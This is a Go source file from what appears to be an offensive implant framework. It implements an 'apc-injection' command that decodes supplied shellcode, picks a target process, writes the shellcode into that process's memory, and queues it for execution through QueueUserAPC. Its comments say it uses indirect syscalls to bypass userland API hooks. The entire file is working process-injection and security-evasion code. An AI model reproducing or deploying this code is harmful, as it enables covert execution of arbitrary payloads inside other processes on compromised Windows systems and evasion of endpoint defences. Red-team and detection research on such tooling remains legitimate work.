//go:build windows
// +build windows

// Package commands provides the apc-injection command for QueueUserAPC-based process injection.
//
// Automatically dispatches to indirect syscalls (Nt* via ntdll gadgets) when available,
// bypassing userland API hooks.
//
// Requirements:
// - Target thread must be in an alertable wait state (Suspended or DelayExecution)
// - Use the 'ts' command to identify alertable threads before injection
package commands

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"runtime"
	"strings"
	"unsafe"

	"fawkes/pkg/structs"
)

// Thread access rights for APC injection
const (
	THREAD_SET_CONTEXT    = 0x0010
	THREAD_GET_CONTEXT    = 0x0008
	THREAD_SUSPEND_RESUME = 0x0002
	THREAD_TERMINATE      = 0x0001
	THREAD_ALL_ACCESS     = 0x001F03FF
)

// Windows API procedures for APC injection
var (
	procOpenThread   = kernel32.NewProc("OpenThread")
	procQueueUserAPC = kernel32.NewProc("QueueUserAPC")
	procResumeThread = kernel32.NewProc("ResumeThread")
	procGetThreadId  = kernel32.NewProc("GetThreadId")
	// procVirtualProtectX is declared in hollowing.go (shared within package)
)

// ApcInjectionCommand implements the apc-injection command
type ApcInjectionCommand struct{}

func (c *ApcInjectionCommand) Name() string { return "apc-injection" }
func (c *ApcInjectionCommand) Description() string {
	return "Perform APC injection into an alertable thread"
}

// ApcInjectionParams represents the parameters for apc-injection
type ApcInjectionParams struct {
	ShellcodeB64 string `json:"shellcode_b64"`
	PID          int    `json:"pid"`
	TID          int    `json:"tid"`
	Target       string `json:"target"` // "auto", "auto-elevated", "auto-user"
}

func (c *ApcInjectionCommand) Execute(task structs.Task) structs.CommandResult {
	ensureInjectionAPIs()
	if runtime.GOOS != "windows" {
		return errorResult("Error: This command is only supported on Windows")
	}

	var params ApcInjectionParams
	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
		return errorf("Error parsing parameters: %v", err)
	}

	if params.ShellcodeB64 == "" {
		return errorResult("Error: No shellcode data provided")
	}

	// Auto-select target if target mode is specified
	if params.Target != "" && params.PID <= 0 {
		mode := TargetMode(strings.ToLower(params.Target))
		targets, terr := SelectInjectionTarget(mode)
		if terr != nil {
			return errorf("Target selection failed: %v", terr)
		}
		bestPID, berr := BestTarget(targets)
		if berr != nil {
			return errorf("No suitable target: %v", berr)
		}
		params.PID = int(bestPID)
	}

	if params.PID <= 0 {
		return errorResult("Error: Invalid PID specified")
	}
	if params.TID <= 0 {
		return errorResult("Error: Invalid Thread ID specified")
	}

	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
	if err != nil {
		return errorf("Error decoding shellcode: %v", err)
	}
	if len(shellcode) == 0 {
		return errorResult("Error: Shellcode data is empty")
	}

	output, err := performApcInjection(shellcode, params.PID, params.TID)
	if err != nil {
		return errorResult(output + fmt.Sprintf("\n[!] Injection failed: %v", err))
	}
	return successResult(output)
}

func performApcInjection(shellcode []byte, pid int, tid int) (string, error) {
	var sb strings.Builder

	sb.WriteString("[*] APC Injection starting\n")
	sb.WriteString(fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode)))
	sb.WriteString(fmt.Sprintf("[*] Target PID: %d, TID: %d\n", pid, tid))

	// Check thread state and warn if not alertable
	threadState := getThreadWaitReason(uint32(tid))
	sb.WriteString(fmt.Sprintf("[*] Target thread state: %s\n", threadState))

	if threadState != "Suspended" && threadState != "DelayExecution" &&
		threadState != "WrSuspended" && threadState != "WrDelayExecution" {
		sb.WriteString(fmt.Sprintf("[!] WARNING: Thread is not in an alertable state (%s)\n", threadState))
		sb.WriteString("[!] APC may not execute until thread enters an alertable wait\n")
	}

	if IndirectSyscallsAvailable() {
		sb.WriteString("[*] Using indirect syscalls (Nt* via stubs)\n")
	}

	// Step 1: Open process
	desiredAccess := uint32(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
		PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ)

	hProcess, err := injectOpenProcess(desiredAccess, uint32(pid))
	if err != nil {
		return sb.String(), err
	}
	defer injectCloseHandle(hProcess)
	sb.WriteString(fmt.Sprintf("[+] Opened process handle: 0x%X\n", hProcess))

	// Step 2-4: Allocate RW → write shellcode → protect RX (W^X)
	remoteAddr, err := injectAllocWriteProtect(hProcess, shellcode, PAGE_EXECUTE_READ)
	if err != nil {
		return sb.String(), err
	}
	sb.WriteString(fmt.Sprintf("[+] Shellcode at 0x%X (RW→RX, %d bytes)\n", remoteAddr, len(shellcode)))

	// Step 5: Open thread
	hThread, err := injectOpenThread(THREAD_ALL_ACCESS, uint32(tid))
	if err != nil {
		return sb.String(), err
	}
	defer injectCloseHandle(hThread)
	sb.WriteString(fmt.Sprintf("[+] Opened thread handle: 0x%X\n", hThread))

	// Step 6: Queue APC
	if err := injectQueueAPC(hThread, remoteAddr); err != nil {
		return sb.String(), err
	}
	sb.WriteString("[+] APC queued successfully\n")

	// Step 7: Resume if suspended
	if threadState == "Suspended" || threadState == "WrSuspended" {
		sb.WriteString("[*] Thread is suspended, resuming...\n")
		prevCount, err := injectResumeThread(hThread)
		if err != nil {
			sb.WriteString(fmt.Sprintf("[!] %v\n", err))
		} else {
			sb.WriteString(fmt.Sprintf("[+] Thread resumed, previous suspend count: %d\n", prevCount))
		}
	} else {
		sb.WriteString("[*] Thread not suspended, APC will execute when thread enters alertable wait\n")
	}

	sb.WriteString("[+] APC injection completed successfully\n")
	return sb.String(), nil
}

// getThreadWaitReason returns the wait reason for a thread
func getThreadWaitReason(tid uint32) string {
	var bufferSize uint32 = 1024 * 1024
	var buffer []byte
	var returnLength uint32

	for {
		buffer = make([]byte, bufferSize)
		ret, _, _ := procNtQuerySystemInformation.Call(
			uintptr(SystemProcessInformation),
			uintptr(unsafe.Pointer(&buffer[0])),
			uintptr(bufferSize),
			uintptr(unsafe.Pointer(&returnLength)),
		)

		if ret == 0xC0000004 { // STATUS_INFO_LENGTH_MISMATCH
			bufferSize = returnLength + 65536
			continue
		}

		if ret != 0 {
			return "Unknown"
		}
		break
	}

	offset := uint32(0)
	for {
		if offset >= uint32(len(buffer)) {
			break
		}

		procInfo := (*SYSTEM_PROCESS_INFORMATION)(unsafe.Pointer(&buffer[offset]))
		threadOffset := offset + uint32(unsafe.Sizeof(SYSTEM_PROCESS_INFORMATION{}))

		for i := uint32(0); i < procInfo.NumberOfThreads; i++ {
			if threadOffset >= uint32(len(buffer)) {
				break
			}

			threadInfo := (*SYSTEM_THREAD_INFORMATION)(unsafe.Pointer(&buffer[threadOffset]))

			if uint32(threadInfo.ClientId.UniqueThread) == tid {
				return getWaitReasonString(threadInfo.WaitReason)
			}

			threadOffset += uint32(unsafe.Sizeof(SYSTEM_THREAD_INFORMATION{}))
		}

		if procInfo.NextEntryOffset == 0 {
			break
		}
		offset += procInfo.NextEntryOffset
	}

	return "Unknown"
}
